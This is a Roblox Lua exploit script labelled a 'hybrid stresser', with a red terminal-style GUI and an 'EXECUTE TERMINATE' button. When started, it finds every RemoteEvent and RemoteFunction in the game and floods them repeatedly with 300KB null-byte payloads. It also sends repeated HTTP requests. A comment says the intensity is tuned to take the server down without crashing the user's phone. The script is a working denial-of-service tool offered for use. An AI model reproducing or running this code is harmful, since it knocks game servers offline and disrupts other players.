-- [[ BEAST TERMINATOR: AUTO-MAX HYBRID STRESSER ]] --
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

local isFlooding = false
local autoIntensity = 250 -- Nilai optimal untuk mematikan server tanpa membuat HP crash
local payload = string.rep("\0", 300000) -- 300KB Null-Data

-- [[ UI CONSTRUCTION: CLEAN & DEADLY ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 350, 0, 380)
Main.Position = UDim2.new(0.5, -175, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
Main.Visible = false
Instance.new("UICorner", Main)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(255, 0, 0)
Stroke.Thickness = 3

-- [[ MONITOR TERMINAL ]] --
local Monitor = Instance.new("Frame", Main)
Monitor.Size = UDim2.new(0.9, 0, 0, 160)
Monitor.Position = UDim2.new(0.05, 0, 0.05, 0)
Monitor.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Instance.new("UICorner", Monitor)

local ConsoleTxt = Instance.new("TextLabel", Monitor)
ConsoleTxt.Size = UDim2.new(1, -20, 1, -20)
ConsoleTxt.Position = UDim2.new(0, 10, 0, 10)
ConsoleTxt.BackgroundTransparency = 1
ConsoleTxt.Text = "> PHANTOM_OS: READY\n> SCANNING REMOTES...\n> STATUS: STANDBY"
ConsoleTxt.TextColor3 = Color3.fromRGB(255, 50, 50)
ConsoleTxt.Font = Enum.Font.Code
ConsoleTxt.TextSize = 11
ConsoleTxt.TextXAlignment = Enum.TextXAlignment.Left
ConsoleTxt.TextYAlignment = Enum.TextYAlignment.Top

-- PROGRESS BAR
local BarBack = Instance.new("Frame", Monitor)
BarBack.Size = UDim2.new(1, 0, 0, 4)
BarBack.Position = UDim2.new(0, 0, 1, -4)
BarBack.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

-- [[ BRUTAL ENGINE ]] --
local function runTerminator()
    local remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end

    task.spawn(function()
        while isFlooding do
            for i = 1, autoIntensity do
                task.defer(function()
                    pcall(function()
                        -- HTTP Flood
                        HttpService:GetAsync("https://google.com/gen_204?id=" .. tick())
                        -- Remote Hybrid Flood
                        for r = 1, #remotes do
                            local target = remotes[r]
                            if target:IsA("RemoteEvent") then
                                target:FireServer(payload, payload)
                            elseif target:IsA("RemoteFunction") then
                                task.spawn(function() target:InvokeServer(payload) end)
                            end
                        end
                    end)
                end)
            end
            task.wait(0.08)
        end
    end)
end

-- [[ ANIMATION LOOP ]] --
task.spawn(function()
    local frames = {"▖", "▘", "▝", "▗"}
    local step = 0
    while true do
        if isFlooding then
            step = step + 1
            ConsoleTxt.Text = string.format(
                "> EXECUTING AUTO_STRESSER %s\n> INJECTING: %d THREADS\n> DATA_RATE: MAX\n> STATUS: SERVER_TIMEOUT",
                frames[step % #frames + 1], autoIntensity
            )
            BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.6)
            task.wait(0.6)
            BarFill.Size = UDim2.new(0, 0, 1, 0)
        else
            ConsoleTxt.Text = "> PHANTOM_OS: ONLINE\n> PROTECTION: ENCRYPTED\n> STANDBY..."
            task.wait(0.5)
        end
    end
end)

-- [[ MAIN BUTTON ]] --
local StartBtn = Instance.new("TextButton", Main)
StartBtn.Size = UDim2.new(0.9, 0, 0, 100)
StartBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
StartBtn.Text = "EXECUTE TERMINATE"
StartBtn.TextColor3 = Color3.new(1,1,1)
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 22
Instance.new("UICorner", StartBtn)

StartBtn.MouseButton1Click:Connect(function()
    isFlooding = not isFlooding
    if isFlooding then
        StartBtn.Text = "STOPPING..."
        StartBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        runTerminator()
    else
        StartBtn.Text = "EXECUTE TERMINATE"
        StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    end
end)

-- [[ ICON & DRAG ]] --
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 60, 0, 60)
Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
Icon.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Icon.Image = "rbxassetid://6031094678"
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
Instance.new("UIStroke", Icon).Color = Color3.fromRGB(255, 0, 0)

Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
local function drag(o)
    local s, i, sp
    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
end
drag(Icon); drag(Main)
